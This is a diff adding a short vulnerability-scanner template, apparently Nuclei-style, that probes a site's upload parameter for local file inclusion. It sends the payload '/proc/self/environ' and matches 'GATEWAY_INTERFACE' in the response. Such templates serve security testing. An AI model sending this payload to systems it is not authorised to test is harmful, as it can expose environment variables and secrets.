@@ -1,0 +1,20 @@
+id: lfi6-0745
+name: 'Traversal in upload'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via upload'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      upload:
+        - '/proc/self/environ'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'GATEWAY_INTERFACE'
